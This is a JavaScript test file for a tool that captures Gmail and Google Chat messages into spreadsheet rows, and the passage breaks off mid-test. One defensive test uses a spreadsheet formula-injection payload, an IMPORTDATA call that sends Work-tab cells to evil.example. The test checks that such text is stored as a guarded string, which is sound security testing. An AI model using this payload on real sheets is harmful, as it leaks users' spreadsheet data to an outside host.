'use strict';
const { fixture, fixtureJson, findUnsafe } = require('./fixtures/helpers');
const { buildChatFixture, buildChatServer, buildLiveReplay, deleteMessage, ME } = require('./fixtures/chat-api');

const WEEKDAY_NOW = '2026-10-08T02:15:00Z'; // Thursday 06:15 Dubai
const WEEKEND_NOW = '2026-10-10T02:15:00Z'; // Saturday 06:15 Dubai

function seedKnownRows(sb) {
  // One Inbox row, one Work task and one Personal task already hold keys from the Gmail fixture.
  sb.mock.seed('Inbox', [['I-known001', new Date('2026-10-07T03:00:00Z'), 'Gmail', 'Hana <hana@aisa.sch.ae>', 'Already captured',
    'snip', 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-known-inbox', 'gmail:msg-known-inbox-1', 'Ignored', '', 'Work']]);
  sb.gs.addTask_({ category: 'Work', title: 'Already a task', sourceKey: 'gmail:msg-known-task-1', source: 'Gmail' });
  sb.gs.addTask_({ category: 'Personal', title: 'Already a personal task', sourceKey: 'gmail:msg-known-personal-1', source: 'Gmail' });
}

/** A sender whose From, Subject and body all start with "=": the classic sheet formula-injection payload. */
const EVIL_SUBJECT = '=IMPORTDATA("https://evil.example/?d="&ENCODEURL(JOIN(",",Work!C2:C500)))';
function injectionThread() {
  return {
    id: 'thread-evil',
    subject: EVIL_SUBJECT,
    messages: [{ id: 'msg-evil-1', from: '=HYPERLINK("https://evil.example","Mallory") <mallory@example.com>', subject: EVIL_SUBJECT,
      body: '=1+1 please see the attached invoice\n\nMallory' }]
  };
}

function setupGmail(sb, extraThreads) {
  const threads = fixtureJson('gmail-threads.json').concat(extraThreads || []);
  sb.mock.gmail.setThreads(threads);
  sb.mock.gmail.aliases = ['brandon.abaki@aisa.sch.ae'];
  sb.mock.gmail.searchHandler = (query, all) => {
    const wantsChat = /chat-noreply@google\.com/.test(query);
    return all.filter((th) => {
      const first = th.messages[0]; // mock-internal array: keeps the per-thread getMessages() counter for the code under test
      const isChatMail = !!first && /chat-noreply@google\.com/i.test(first.getFrom());
      return wantsChat ? isChatMail : !isChatMail;
    });
  };
}

function chatEmailThread() {
  return {
    id: 'thread-chatmail',
    subject: 'Sara Khan sent you a message in Google Chat',
    messages: [{ id: 'msg-chatmail-1', from: 'Google Chat <chat-noreply@google.com>', subject: 'Sara Khan sent you a message in Google Chat',
      body: fixture('chat-notification-email.txt') }]
  };
}

// ---- Chat conversation fixtures (SPEC 6 "Capture (Chat)": one row per space, new + substantive messages) ----
const SARA = { name: 'users/1', displayName: 'Sara Khan', email: 'sara.khan@aisa.sch.ae', type: 'HUMAN' };
const OMAR = { name: 'users/2', displayName: 'Omar Haddad', email: 'omar@aisa.sch.ae', type: 'HUMAN' };
const MAYA = { name: 'users/3', displayName: 'Maya Lin', email: 'maya.lin@aisa.sch.ae', type: 'HUMAN' };
const NADIA = { name: 'users/4', displayName: 'Nadia', email: 'nadia@aisa.sch.ae', type: 'HUMAN' };
const LINA = { name: 'users/7', displayName: 'Lina Park', email: 'lpark@aisa.sch.ae', type: 'HUMAN' };
const BOT = { name: 'users/bot', displayName: 'Reminder Bot', type: 'BOT' };
const MENTION_ME = { type: 'USER_MENTION', length: 14, userMention: { user: { name: 'users/me', email: 'bbaki@aisa.sch.ae', type: 'HUMAN' }, type: 'MENTION' } };

function hoursBefore(h) {
  return new Date(new Date(WEEKDAY_NOW).getTime() - h * 3600000).toISOString();
}
function chatMsg(space, id, sender, h, text, extra) {
  return Object.assign({ name: space + '/messages/' + id, sender: sender, createTime: hoursBefore(h), text: text }, extra || {});
}
function dmSpace(id, extra) {
  return Object.assign({ name: 'spaces/' + id, spaceType: 'DIRECT_MESSAGE', lastActiveTime: hoursBefore(1), spaceUri: 'https://chat.google.com/dm/' + id }, extra || {});
}
function useChatServer(sb, server) {
  sb.mock.urlFetch.handler = server.handler;
  sb.mock.gmail.setThreads([]);
}
function chatRows(sb) {
  return sb.gs.readRows('Inbox').filter((r) => r.source === 'Chat');
}
/**
 * Two capture runs that overlap (the 06:15 trigger + "Run capture now"): the inner run starts while
 * the outer one is reading the space's messages. innerFirst = the inner run reads messages 1..2 and
 * message 3 arrives before the outer read (the outer row holds 1..3); otherwise message 3 arrives
 * first, the inner run reads 1..3 and the outer read still returns 1..2.
 */
function overlappingRuns(sb, innerFirst) {
  const S = 'spaces/DMLAP';
  const third = chatMsg(S, '3.3', SARA, 0.1, 'Also please count the spare servos');
  const server = buildChatServer({ spaces: [dmSpace('DMLAP')], messages: { [S]: [
    chatMsg(S, '1.1', SARA, 5, 'Please check the robotics kits today'),
    chatMsg(S, '2.2', SARA, 4, 'The order form is on the shared drive')
  ] } });
  useChatServer(sb, server);
  let nested = false;
  let inner = null;
  sb.mock.urlFetch.handler = (url, params) => {
    if (nested || !/\/messages\?/.test(url)) return server.handler(url, params);
    nested = true;
    if (innerFirst) {
      inner = sb.gs.runCaptureNow_();
      server.messages[S].push(third);
      return server.handler(url, params);
    }
    const res = server.handler(url, params);
    server.messages[S].push(third);
    inner = sb.gs.runCaptureNow_();
    return res;
  };
  const outer = sb.gs.runCaptureNow_();
  return { S: S, inner: inner, outer: outer };
}

/** An Inbox row the first live run (one row per message) would have written for `message`. */
function perMessageRow(id, message, status) {
  return [id, new Date('2026-10-07T03:00:00Z'), 'Chat', message.sender.displayName, 'Direct message', message.text || '',
    'https://chat.google.com/dm/X', 'chat:' + message.name, status || 'New', '', 'Work'];
}

module.exports = async function (t) {
  await t.test('Gmail capture: bulk load, me-detection, bulk filters, dedupe, snippet cleaning and link format', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    seedKnownRows(sb);
    setupGmail(sb);
    sb.mock.gmail.bulkLoads = 0;
    sb.mock.gmail.perThreadLoads = 0;
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 3, chat: 0, chatMessages: 0, chatMode: 'off', errors: [] });
    assert.equal(sb.mock.gmail.searches.length, 1, 'one search');
    assert.match(sb.mock.gmail.searches[0].query, /newer_than:2d/);
    assert.equal(sb.mock.gmail.searches[0].max, 50);
    assert.equal(sb.mock.gmail.bulkLoads, 1, 'SPEC 6: one GmailApp.getMessagesForThreads(threads) call');
    assert.equal(sb.mock.gmail.perThreadLoads, 0, 'never thread.getMessages() per thread');
    const rows = sb.gs.readRows('Inbox').map((r) => r).filter((r) => r.id !== 'I-known001');
    assert.equal(rows.length, 3);
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-dtr-1'), 'a thread with a draft is skipped even when someone wrote after the draft');
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-known-personal-1'), 'deduped against the Personal tab');
    assert.ok(!rows.some((r) => r.sourceKey === 'gmail:msg-al-1'), 'skipped when the LAST message is automated (out-of-office after a human ask)');
    const human = rows.find((r) => r.sourceKey === 'gmail:msg-lh-1');
    assert.ok(human, 'captured when a human replied after a list message: the automated check looks at the last message');
    assert.equal(human.from, 'Omar Haddad <omar@aisa.sch.ae>');
    const ask = rows.find((r) => r.sourceKey === 'gmail:msg-ask-1');
    assert.ok(ask, 'first message id is the key');
    assert.match(ask.id, /^I-[a-z0-9]{8}$/);
    assert.equal(ask.source, 'Gmail');
    assert.equal(ask.from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    assert.equal(ask.subject, 'Lab timetable for next week');
    assert.equal(ask.snippet, 'Hi Brandon, Could you send me the ICT lab timetable for next week by Thursday? Thanks, Sara');
    assert.equal(ask.link, 'https://mail.google.com/mail/u/bbaki@aisa.sch.ae/#all/thread-ask');
    assert.equal(ask.status, 'New');
    assert.equal(ask.categoryHint, 'Work');
    assert.equal(Object.prototype.toString.call(ask.captured), '[object Date]');
    const second = rows.find((r) => r.sourceKey === 'gmail:msg-second-1');
    assert.ok(second, 'thread where someone replied after me is captured, keyed by the FIRST message');
    assert.equal(second.from, 'Maya Lin <maya.lin@aisa.sch.ae>');
    assert.equal(second.snippet, 'Thanks! Could you add a slide on Gemini?');
    // Running again adds nothing
    const again = sb.gs.runCaptureNow_();
    assert.equal(again.gmail, 0);
    assert.equal(sb.gs.readRows('Inbox').length, 4);
    const logs = sb.mock.logRows().filter((r) => r.fn === 'captureInbox');
    assert.equal(logs.length, 2);
    assert.equal(logs[0].level, 'INFO');
    assert.match(logs[0].message, /gmail 3, chat 0 \(mode off\)/);
    assert.equal(findUnsafe(result), '');
  }, { now: WEEKDAY_NOW });

  await t.test('a sender whose From, Subject or body starts with "=" cannot plant a formula in the sheet', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', '']]);
    sb.mock.gmail.setThreads([injectionThread()]);
    const r = sb.gs.runCaptureNow_();
    assert.equal(r.gmail, 1);
    assert.deepEqual(sb.mock.formulas('Inbox'), [], 'no Inbox cell holds a formula (the mock stores a leading "=" as a formula, like Apps Script)');
    const CI = sb.eval('COLUMN.INBOX');
    const cells = sb.mock.rows('Inbox')[0];
    assert.equal(cells[CI.subject], ' ' + EVIL_SUBJECT, 'stored as text behind a guard space');
    assert.equal(cells[CI.snippet], ' =1+1 please see the attached invoice Mallory');
    assert.equal(cells[CI.from], ' =HYPERLINK("https://evil.example","Mallory") <mallory@example.com>');
    const item = sb.gs.listInbox_({}).items[0];
    assert.equal(item.subject, EVIL_SUBJECT, 'the API returns the text without the guard space');
    assert.equal(item.snippet, '=1+1 please see the attached invoice Mallory');
    assert.equal(item.from, '=HYPERLINK("https://evil.example","Mallory") <mallory@example.com>');
    // Promoting it (title from the subject, details from From + snippet) keeps the task tab safe too.
    const task = sb.gs.promoteInbox_({ inboxId: item.id, category: 'Work' }).task;
    assert.deepEqual(sb.mock.formulas('Work'), []);
    assert.equal(task.title, EVIL_SUBJECT.slice(0, 140));
    const C = sb.eval('COLUMN.TASK');
    assert.equal(sb.mock.rows('Work')[0][C.title].charAt(0), ' ');
    assert.equal(sb.gs.readTasks('Work')[0].title, EVIL_SUBJECT.slice(0, 140), 'round-trips without the guard space');
    // Completing (a partial-row write) and healing never turn the guarded text into a formula either.
    sb.gs.completeTask_({ category: 'Work', id: task.id, note: '=SUM(A1:A9)' });
    assert.equal(sb.gs.healSheet('Work').fixed, 0, 'a guard space is not whitespace for healSheet to trim');
    assert.deepEqual(sb.mock.formulas('Work'), []);
    assert.equal(sb.gs.readTasks('Work')[0].note, '=SUM(A1:A9)');
    assert.deepEqual(sb.mock.formulas('Log'), [], 'Log messages carrying the text are guarded as well');
  }, { now: WEEKDAY_NOW });

  await t.test('isAutomatedMessage and myAddresses helpers', (sb, assert) => {
    const mk = (from, headers) => sb.mock.gmail.makeThread({ id: 't', messages: [{ from: from, headers: headers || {} }] }).getMessages()[0];
    assert.ok(sb.gs.isAutomatedMessage(mk('Google Calendar <calendar-notification@google.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <noreply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <no-reply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <DoNotReply@x.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <notifications@github.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('X <notification@slack.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('Mail Delivery <mailer-daemon@google.com>')));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'List-Unsubscribe': '<mailto:x>' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'list-id': 'x.y' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'Bulk' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'list' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'junk' })));
    assert.ok(sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'Auto-Submitted': 'auto-generated' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { 'Auto-Submitted': 'no' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>', { Precedence: 'normal' })));
    assert.ok(!sb.gs.isAutomatedMessage(mk('Human <h@x.com>')));
    sb.mock.gmail.aliases = ['Alias <alias@aisa.sch.ae>'];
    const me = sb.gs.myAddresses(sb.gs.readConfig());
    assert.ok(me.has('bbaki@aisa.sch.ae'));
    assert.ok(me.has('alias@aisa.sch.ae'));
    assert.ok(me.has('brandon.abaki@gmail.com'), 'ALLOWED_EMAILS count as me');
    sb.mock.gmail.aliasesThrow = true;
    assert.ok(sb.gs.myAddresses(sb.gs.readConfig()).has('bbaki@aisa.sch.ae'), 'getAliases failure is tolerated');
  });

  await t.test('Chat API capture: paging, space filters, sender/mention rules, link and subject formats', (sb, assert) => {
    const chat = buildChatFixture({ now: WEEKDAY_NOW });
    sb.mock.urlFetch.handler = chat.handler;
    sb.mock.gmail.setThreads([]);
    // Distinct lookbacks pin which Config key drives which cutoff.
    sb.mock.seed('Config', [['CHAT_LOOKBACK_DAYS', '5', ''], ['GMAIL_LOOKBACK_DAYS', '1', '']]);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 3, chatMessages: 3, chatMode: 'api', errors: [] });
    assert.match(sb.mock.gmail.searches[0].query, /newer_than:1d/, 'GMAIL_LOOKBACK_DAYS drives the Gmail query');
    const rows = sb.gs.readRows('Inbox');
    assert.deepEqual(rows.map((r) => r.sourceKey), chat.expectedKeys);
    const dm = rows[0];
    assert.equal(dm.source, 'Chat');
    assert.equal(dm.from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    assert.equal(dm.subject, 'Direct message');
    assert.equal(dm.snippet, 'Sara: Can you share the AI workshop slides before Thursday?', 'my own reply after it is not shown');
    assert.equal(dm.link, 'https://chat.google.com/dm/DM1', 'spaceUri preferred');
    assert.equal(dm.categoryHint, 'Work');
    assert.equal(rows[1].link, 'https://mail.google.com/chat/u/0/#chat/space/GRP1', 'fallback link without spaceUri');
    assert.equal(rows[1].subject, 'Group chat', 'an unnamed GROUP_CHAT');
    assert.equal(rows[1].snippet, 'Omar: Who is covering the lab on Monday?', 'the bot message is not shown');
    assert.equal(rows[2].subject, 'Science Department');
    assert.equal(rows[2].from, 'Maya Lin <maya.lin@aisa.sch.ae>');
    assert.equal(rows[2].snippet, 'Maya: @Brandon Abaki can you approve the lab booking?', 'SPACE: only the message that @mentions me');
    // Requests: 2 space pages + messages for DM1, GRP1, ROOM1 only (OLD and the bot DM are skipped);
    // ROOM1 answers in two pages, so it is fetched twice.
    const urls = sb.mock.urlFetch.calls.map((c) => c.url);
    assert.equal(urls.filter((u) => /\/v1\/spaces\?/.test(u)).length, 2);
    assert.ok(urls.some((u) => u.includes('pageToken=page2')));
    const msgUrls = urls.filter((u) => /\/messages\?/.test(u));
    assert.deepEqual(msgUrls.map((u) => /v1\/(spaces\/[^/]+)\//.exec(u)[1]), ['spaces/DM1', 'spaces/GRP1', 'spaces/ROOM1', 'spaces/ROOM1']);
    assert.ok(urls.some((u) => /spaces\/ROOM1\/messages\?.*pageToken=mp2/.test(u)), 'second messages page requested while nextPageToken is set');
    assert.ok(rows.some((r) => r.sourceKey === 'chat:spaces/ROOM1/messages/r1.r1'), 'the mention served on page 2 is written');
    msgUrls.forEach((u) => {
      assert.ok(u.includes('pageSize=100'));
      const filter = decodeURIComponent(/filter=([^&]+)/.exec(u)[1]);
      assert.match(filter, /^create_time > "2026-10-03T02:15:00Z"$/, 'CHAT_LOOKBACK_DAYS (5) drives the Chat cutoff: ' + filter);
    });
    sb.mock.urlFetch.calls.forEach((c) => {
      assert.equal(c.params.muteHttpExceptions, true);
      assert.equal(c.params.headers.Authorization, 'Bearer mock-oauth-token');
    });
    // Second run: nothing new
    assert.equal(sb.gs.runCaptureNow_().chat, 0);
    assert.equal(sb.gs.readRows('Inbox').length, 3);
  }, { now: WEEKDAY_NOW });

  await t.test('a GMAIL_QUERY that carries its own newer_than:/after: gets nothing appended', (sb, assert) => {
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', ''], ['GMAIL_QUERY', 'in:inbox newer_than:3d', '']]);
    sb.mock.gmail.setThreads([]);
    sb.gs.runCaptureNow_();
    assert.equal(sb.mock.gmail.searches[0].query, 'in:inbox newer_than:3d');
    sb.mock.sheet('Config').clearContents();
    sb.mock.sheet('Config').appendRow(['Key', 'Value', 'Notes']);
    sb.mock.seed('Config', [['CHAT_ENABLED', 'FALSE', ''], ['GMAIL_QUERY', 'to:me after:2026/10/01', '']]);
    sb.gs.clearConfigMemo();
    sb.gs.runCaptureNow_();
    assert.equal(sb.mock.gmail.searches[1].query, 'to:me after:2026/10/01');
  }, { now: WEEKDAY_NOW });

  await t.test('chatMessageWanted rules', (sb, assert) => {
    const me = new Set(['bbaki@aisa.sch.ae']);
    const human = (email, extra) => Object.assign({ name: 'spaces/X/messages/1', sender: { type: 'HUMAN', email: email, displayName: 'P' }, text: 'hi' }, extra || {});
    const dm = { spaceType: 'DIRECT_MESSAGE' };
    const room = { spaceType: 'SPACE' };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), dm, me), true);
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), { spaceType: 'GROUP_CHAT' }, me), true);
    assert.equal(sb.gs.chatMessageWanted(human('BBAKI@aisa.sch.ae'), dm, me), false, 'from me');
    assert.equal(sb.gs.chatMessageWanted({ sender: { type: 'BOT' }, text: 'x' }, dm, me), false);
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com'), room, me), false, 'space without mention');
    const mention = { annotations: [{ type: 'USER_MENTION', userMention: { user: { email: 'bbaki@aisa.sch.ae' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', mention), room, me), true);
    const otherMention = { annotations: [{ type: 'USER_MENTION', userMention: { user: { email: 'o@y.com' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', otherMention), room, me), false);
    const wrongType = { annotations: [{ type: 'RICH_LINK', userMention: { user: { email: 'bbaki@aisa.sch.ae' } } }] };
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', wrongType), room, me), false, 'only USER_MENTION annotations count');
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', { annotations: 'junk' }), room, me), false, 'malformed annotations are ignored');
    assert.equal(sb.gs.chatMessageWanted(human('x@y.com', { annotations: [null, {}] }), room, me), false);
    assert.equal(sb.gs.chatMessageWanted(null, room, me), false);
    const row = sb.gs.chatConversationToInbox([human('x@y.com')], { name: 'spaces/X', spaceType: 'SPACE', displayName: '' });
    assert.equal(row.link, 'https://mail.google.com/chat/u/0/#chat/space/X');
    assert.equal(row.subject, 'Direct message');
    assert.equal(row.sourceKey, 'chat:spaces/X/messages/1');
  });

  await t.test('chatTextSubstantive: every noise row of the first live run is dropped, every useful one kept (Arabic verbatim)', (sb, assert) => {
    const live = buildLiveReplay({ now: WEEKDAY_NOW });
    live.texts.noise.forEach((text) => assert.equal(sb.gs.chatTextSubstantive(text), false, 'noise: ' + JSON.stringify(text)));
    live.texts.useful.forEach((text) => assert.equal(sb.gs.chatTextSubstantive(text), true, 'useful: ' + JSON.stringify(text)));
    // The Arabic noise, spelled out: good morning, how are you today, come for breakfast, waiting for you.
    ['صباح الخير', 'كيفك اليوم', 'تفضل عالفطور', 'بانتظارك'].forEach((text) => assert.equal(sb.gs.chatTextSubstantive(text), false, text));
    // Acknowledgements, whatever the case, punctuation, emoji or diacritics.
    ['OK', 'Thanks!! 🙏', 'thank you.', 'Got it 👍', 'شكراً', 'شكرا!', 'تمام', 'Take care', '  Will do  ', 'Ok?', 'Yes!!!', 'لا'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), false, 'acknowledgement: ' + text));
    // Never substantive: empty, emoji-only, numbers-only, phone-number-like (ASCII or Arabic-Indic
    // digits), or a phone number with only an acknowledgement or a short word around it.
    [null, undefined, '', '   ', '👍👍', '😂😂😂', '216', '12345678901234', '+971 50 126 0445', '(050) 648-0801',
      'Sure - 0501260445', 'Ok 050 126 0445', '٠٥٠١٢٦٠٤٤٥', 'تفضل ٠٥٠١٢٦٠٤٤٥', 'رقمي ٠٥٠١٢٦٠٤٤٥', 'Mobile: 050-648-0801'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), false, 'never: ' + JSON.stringify(text)));
    // Short pleasantries: under 12 characters once interjections are peeled off the start and
    // acknowledgements (and longer thank-yous) off the end.
    ['I saw it.', 'Aww poor thing', 'Oh shoot! Take care', 'thanks a lot', 'Thank you so much!', 'ok ok ok ok ok', 'Hi Brandon',
      'All good, thanks', 'Wow ok'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), false, 'short: ' + text));
    // Kept: a question (Latin or Arabic mark), a URL, or 12+ characters.
    ['Why?', 'Room 216?', 'هل يمكنك الحضور؟', 'https://docs.google.com/document/d/abc', 'thanks https://drive.google.com/x',
      'Please send the rubric', 'Call me on 050 126 0445 about the trip tomorrow', 'Good morning! The bus is late today',
      'Can you share the AI workshop slides before Thursday?'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), true, 'kept: ' + text));
    // Kept: short requests and information that rule 3 (12 characters, spaces included) keeps. Times,
    // rooms and dates count (a date is not a phone number), a leading acknowledgement is not peeled
    // ("Ok see you in room 216"), only a trailing one ("Is the report done" counts as "is the report").
    ['Ok see you in room 216', 'Meet at 2:30', 'Come at 2:30', 'Meeting at 3', 'meet me at 3pm', 'Bring laptop', 'Room 216 now',
      'Thanks, see you at 3', 'Call Huda now', 'Need the keys', 'Running late', "I'm sick today", 'Is the report done',
      'Put your name on it', 'Due 2026-10-12', 'Deadline 12/10/2026', 'Exam on 12.10.2026', 'Grades 9 10 11 12 only'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), true, 'short but kept: ' + text));
    // A phone number inside a sentence of 12+ characters: the sentence counts on its own.
    ['Please call me on 0501260445', 'My number is +971 50 126 0445'].forEach((text) =>
      assert.equal(sb.gs.chatTextSubstantive(text), true, 'number in a sentence: ' + text));
  });

  await t.test('Chat: 8 messages in one DM become ONE Inbox row (From, Subject, Snippet oldest first, key = newest message)', (sb, assert) => {
    const texts = ['Can you check the robotics kits?', 'Two kits have no batteries', 'The order form is on the drive',
      'Huda needs the parts list by Tuesday', 'Please count the spare servos', 'The supplier closes next week',
      'Let me know if I should call them', 'I am in the lab after lunch'];
    const all = texts.map((text, i) => chatMsg('spaces/DM8', (i + 1) + '.' + (i + 1), SARA, 10 - i, text));
    // Served out of chronological order and in pages of 3: the capture sorts by createTime across pages.
    const served = [4, 0, 7, 2, 1, 6, 3, 5].map((i) => all[i]);
    const server = buildChatServer({ spaces: [dmSpace('DM8')], messages: { 'spaces/DM8': served }, messagePageSize: 3 });
    useChatServer(sb, server);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 1, chatMessages: 8, chatMode: 'api', errors: [] });
    assert.ok(server.state.calls.some((c) => /messages\?.*pageToken=6/.test(c.url)), 'all three message pages were read');
    const rows = chatRows(sb);
    assert.equal(rows.length, 1);
    const row = rows[0];
    assert.equal(row.from, 'Sara Khan <sara.khan@aisa.sch.ae>');
    assert.equal(row.subject, 'Direct message');
    const expected = texts.map((text) => 'Sara: ' + text).join(' · ');
    assert.ok(expected.length < 400, 'fixture fits without truncation');
    assert.equal(row.snippet, expected);
    assert.equal(row.sourceKey, 'chat:spaces/DM8/messages/8.8', 'the newest message by createTime, not the last one served');
    assert.equal(row.link, 'https://chat.google.com/dm/DM8');
    assert.equal(row.categoryHint, 'Work');
    assert.equal(row.status, 'New');
    assert.equal(Object.prototype.toString.call(row.captured), '[object Date]');
    assert.equal(sb.mock.rows('Inbox')[0].length, 11, 'still the 11 Inbox columns (messageCount is never written)');
    assert.match(sb.mock.logRows().find((r) => r.fn === 'captureInbox').message, /gmail 0, chat 1 \(mode api\), 8 chat message\(s\)/);
    // Run again: nothing new, no row.
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] });
    assert.equal(chatRows(sb).length, 1);
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: the first live run replayed — noise dropped, useful kept, a noise-only DM gives no row', (sb, assert) => {
    const live = buildLiveReplay({ now: WEEKDAY_NOW });
    useChatServer(sb, live);
    const result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 2, chatMessages: 3, chatMode: 'api', errors: [] }, '2 conversations instead of 28 rows');
    const rows = chatRows(sb);
    assert.deepEqual(rows.map((r) => r.subject), ['Direct message', 'Direct message']);
    const hana = rows.find((r) => r.link === 'https://chat.google.com/dm/DMHANA');
    assert.equal(hana.from, 'Hana Saleh <hana.saleh@aisa.sch.ae>');
    assert.equal(hana.snippet, 'Hana: Please can you come to room 216');
    const hanaRequest = live.messages['spaces/DMHANA'].find((m) => m.text === 'Please can you come to room 216');
    assert.equal(hana.sourceKey, 'chat:' + hanaRequest.name, 'key = the newest SHOWN message, not the noise that came after it');
    const omar = rows.find((r) => r.link === 'https://chat.google.com/dm/DMOMAR');
    assert.equal(omar.from, 'Omar Haddad <omar@aisa.sch.ae>');
    assert.equal(omar.snippet, 'Omar: ' + live.texts.useful[1] + ' · Omar: ' + live.texts.useful[2]);
    assert.ok(!rows.some((r) => r.link === 'https://chat.google.com/dm/DMREEM'), 'a conversation of only noise produces no row');
    // Every shown line is a useful text; no noise text is shown anywhere.
    const shown = rows.map((r) => r.snippet.split(' · ').map((line) => line.replace(/^[^:]+: /, ''))).reduce((a, b) => a.concat(b), []);
    assert.deepEqual(shown.slice().sort(), live.texts.useful.slice().sort());
    live.texts.noise.forEach((text) => assert.ok(shown.indexOf(text) < 0, 'not shown: ' + JSON.stringify(text)));
    // Next run: the noise after Hana's request is looked at again and dropped again.
    assert.equal(sb.gs.runCaptureNow_().chat, 0);
    assert.equal(chatRows(sb).length, 2);
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: incremental capture — the next run shows only what came after the last captured message', (sb, assert) => {
    const S = 'spaces/DMINC';
    const server = buildChatServer({ spaces: [dmSpace('DMINC')], messages: { [S]: [
      chatMsg(S, 'm1.m1', OMAR, 10, 'Can you cover my Grade 8 class on Thursday?'),
      chatMsg(S, 'm2.m2', ME, 9.5, 'Yes'),
      chatMsg(S, 'm3.m3', OMAR, 9, 'Thanks!'),
      chatMsg(S, 'm4.m4', OMAR, 8, 'The lesson plan is in the shared folder')
    ] } });
    useChatServer(sb, server);
    let result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 1, chatMessages: 2, chatMode: 'api', errors: [] });
    assert.equal(chatRows(sb)[0].snippet, 'Omar: Can you cover my Grade 8 class on Thursday? · Omar: The lesson plan is in the shared folder');
    assert.equal(chatRows(sb)[0].sourceKey, 'chat:' + S + '/messages/m4.m4');
    // Two new substantive messages arrive, with noise and my own reply between them.
    server.messages[S].push(
      chatMsg(S, 'm5.m5', OMAR, 3, 'ok'),
      chatMsg(S, 'm6.m6', OMAR, 2, 'They are working on the poster project'),
      chatMsg(S, 'm7.m7', ME, 1.5, 'Got it'),
      chatMsg(S, 'm8.m8', OMAR, 1, 'Could you also collect their worksheets?'));
    result = sb.gs.runCaptureNow_();
    assert.deepEqual(result, { gmail: 0, chat: 1, chatMessages: 2, chatMode: 'api', errors: [] });
    const rows = chatRows(sb);
    assert.equal(rows.length, 2);
    assert.equal(rows[1].snippet, 'Omar: They are working on the poster project · Omar: Could you also collect their worksheets?', 'only the two new messages');
    assert.equal(rows[1].sourceKey, 'chat:' + S + '/messages/m8.m8');
    assert.equal(rows[1].from, 'Omar Haddad <omar@aisa.sch.ae>');
    // Nothing new → no row; new noise only → no row.
    assert.deepEqual(sb.gs.runCaptureNow_(), { gmail: 0, chat: 0, chatMessages: 0, chatMode: 'api', errors: [] });
    server.messages[S].push(chatMsg(S, 'm9.m9', OMAR, 0.5, 'Thank you 🙏'));
    assert.equal(sb.gs.runCaptureNow_().chat, 0);
    assert.equal(chatRows(sb).length, 2);
    // Pure: the same decision straight from chatNewMessages.
    const me = new Set(['bbaki@aisa.sch.ae']);
    const keys = new Set(['chat:' + S + '/messages/m4.m4']);
    const picked = sb.gs.chatNewMessages(server.messages[S], server.spaces[0], me, keys).map((m) => m.name);
    assert.deepEqual(picked, [S + '/messages/m6.m6', S + '/messages/m8.m8']);
    assert.deepEqual(sb.gs.chatNewMessages(server.messages[S], server.spaces[0], me, new Set()).map((m) => m.name),
      [S + '/messages/m1.m1', S + '/messages/m4.m4', S + '/messages/m6.m6', S + '/messages/m8.m8'], 'nothing known → the whole window');
  }, { now: WEEKDAY_NOW });

  await t.test('Chat: backward compatible with the per-message rows of the first live run (Inbox and task-tab keys)', (sb, assert) => {
    const live = buildLiveReplay({ now: WEEKDAY_NOW });
    useChatServer(sb, live);
    // The first live run wrote one row per wanted message. Seed those keys (mixed statuses); the
    // newest DMOMAR message was promoted to a Work task and only lives on in the Work tab here.
    const ib = live.messages['spaces/DMOMAR'].find((m) => m.text === live.texts.useful[2]);
    const statuses = ['New', 'Ignored', 'Promoted'];
    const seeded = [];
    Object.keys(live.messages).forEach((space) => {
      live.messages[space].filter((m) => m.sender.email !== ME.email && m !== ib).forEach((m) => {
        seeded.push(perMessageRow('I-live' + String(seeded.length).padStart(4, '0'), m, statuses[seeded.length % 3]));
      });
    });
    sb.mock.seed('Inbox', seeded);
    sb.gs.addTask_({ category: 'Work', title: 'Check IB tutorial times', sourceKey: 'chat:' + ib.name, source: 'Chat' });
    const before = sb.gs.readRows('Inbox').length;
